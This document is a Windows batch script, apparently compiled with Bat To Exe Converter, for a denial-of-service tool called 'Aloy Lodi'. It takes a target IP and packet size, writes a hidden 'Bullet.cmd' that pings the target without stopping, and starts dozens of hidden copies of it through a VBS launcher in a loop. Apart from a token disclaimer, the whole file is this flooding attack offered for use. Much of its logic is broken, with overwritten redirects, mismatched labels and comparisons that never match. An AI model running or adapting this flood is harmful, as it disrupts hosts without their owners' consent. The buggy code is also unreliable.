::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBhXXAGMPXmvBLwd1Mz0+OSLrUwZR94edIDCmpiBJOkvy0nrbNYB2X5T1s4UCXs=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
:::::
::::: Written By: Jovohn Antoine Merick P. Faulve (JamStudios Corporation) :::::
:::::
::::: NOTE: This work has the license of CC BY-SA 4.0 as details is said below :::::
::::: Attribution-ShareAlike 4.0 International
::::: This license requires that reusers give credit to the creator. It allows reusers to distribute, remix, adapt, 
::::: and build upon the material in any medium or format, even for commercial purposes. If others remix, adapt, or 
::::: build upon the material, they must license the modified material under identical terms.
::::: Learn more: https://creativecommons.org/licenses/by-sa/4.0/
:::::
::::: WARNING: Any Use of Unethical Hacking in use of this script/software is in violation of unathorized access
:::::          YOU the user of using this software holds to YOU RESPONSIBLE for ANY DAMAGES Caused by this program
:::::          In by Using the software you are RESPONSIBLE for whatever Happends.
:::::
::::: Software Details:
:::::   Version: Beta 1.0
:::::   Name: Aloy Lodi (Large Output Data Impulser)
:::::   Programming Language: Batch/Cmd (Command Line Proccessor)
:::::   Published in: August, 6, 2021
:::::   Report Bugs: JamStudios.corp@outlook.com
:::::                With the <subject> as "Aloy Lodi Bug Report [Bug]"
:::::                Any Question <subject> as "Aloy Lodi Question [Question]"

@ECHO OFF         
@Title JamStudios Corporation - Aloy Lodi (Large Output Data Impulser)
@color 0c       
@mode con: cols=116 lines=30
echo.
echo  WARNING: Any Use of Unethical Hacking in use of this script/software is in violation of unathorized access
echo           YOU the user of using this software holds to YOU RESPONSIBLE for ANY DAMAGES Caused by this program
echo           In by Using the software you are RESPONSIBLE for whatever Happends.
echo.
echo  I Agree, and continue with Aloy Lodi
pause >nul
:Main
cls
echo        =       ==                ==             =     
echo       = =       =                 =             =   =
echo      =   =      =                 =             =      
echo     =======     =   ===  =    =   =   ===    ====  ==  
echo    =       =    =  =   =  =  =    =  =   =  =   =   =  
echo   =         =   =  =   =   ==     =  =   =  =   =   =  
echo  =           =  =   ===    =      =   ===    ====  ===  
echo                           =      
echo                          =     
echo.  
echo  [CC BY-SA 4.0] Creative Commons (CC) JamStudios Corporation since 2021
echo  Aloy Lodi (Aloy, Large Output Data Impulser)
echo.
set /p IPadress="IP:>>"
echo.
echo  How many Rounds (Worms) to Generate and attack?
echo          NOTE: Reccommended 1-50 any higher might
echo                Consume more CPU Power.
set /p Rounds="Rounds>>"
echo.
echo  Firerate determines how much Bytes the Rounds (Worms)
echo          Does damage to a host. (Max: 65000)
set /p Firerate="Firerate>>"
echo.
echo   Were going to use a testing tool if your Firerate
echo        Can be allowed by the server / host.
echo.
ping %IPadress% -n 1 -l %Firerate%
echo.
echo Was The Ping Successful?
echo.
set /p Options="[Y/N]:"
if %Options%=='Y' goto StartAttack
if %Options%=='y' goto StartAttack
if %Options%=='N' goto Main
if %Options%=='n' goto Main
if not %Options%=='' goto AimSights

:StartAttack
echo.
echo Aloy Lodi: Nice! were going to inject a bullet code in
echo            In Your System (Creating the Bullets for
echo            The Attack.)
mkdir c:\AloyLodi
attrib +h c:\AloyLodi
:::::: BULET SCRIPT ::::::
echo ping %IPadress% -t -l %Firerate% > c:\AloyLodi\Bullet.cmd
echo del c:\AloyLodi\Status-Online.state > c:\AloyLodi\Bullet.cmd
echo exit/b > c:\AloyLodi\Bullet.cmd
:::::: BULET SCRIPT ::::::
echo.
echo Aloy Lodi: Preparing DDOS Worm.
:::::: HIDE UI SCRIPT ::::::
echo CreateObject("Wscript.Shell").Run "c:\AloyLodi\%Rand%Bullet.cmd",0,True > c:\AloyLodi\Hide.vbs
:::::: HIDE UI SCRIPT ::::::
set Launch=5
:LaunchReadyIn
if %Launch%=='0' goto Launch
set Launch=%Launch%-1
echo Aloy Lodi: Bullets are now created, Now Ready for fire.
echo            Attack Launching in (%Launc%)
TIMEOUT /T 1 /NOBREAK >nul
goto LaunchReady
:Launch
set /a Shots=0
set /a Time=0
set /a Send=0
echo ping %IPadress% -t -l 50 > c:\
:::::: ATTACK UI ::::::
:Loop
set /a Shots=%Shots%+1
set /a Time=%Time%+1
set /a Send=%Send%+1
set /a Send=%Send%*%Rounds%
cls
echo        =       ==                ==             =     
echo       = =       =                 =             =   =
echo      =   =      =                 =             =      
echo     =======     =   ===  =    =   =   ===    ====  ==  
echo    =       =    =  =   =  =  =    =  =   =  =   =   =  
echo   =         =   =  =   =   ==     =  =   =  =   =   =  
echo  =           =  =   ===    =      =   ===    ====  ===  
echo                           =
echo                          =
echo.
echo Aloy Lodi: Below you will see the ping when it stops
echo            Attack Successful, Note: That it will take time
echo            And CPU Power.
echo.
echo - Shots: %Shots% - Time: %DDOSTime% - Send: %Send%/MB
echo.
if not exist c:\AloyLodi\Status-Online.state goto Status-Offline 
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
start c:\AloyLodi\Hide.vbs >nul
TIMEOUT /T 1 /NOBREAK >NUL
goto Loop
:::::: ATTACK UI ::::::

:Status-Offline
color 0a
echo Attack On %IPadress% Was Successful! 
pause
goto Main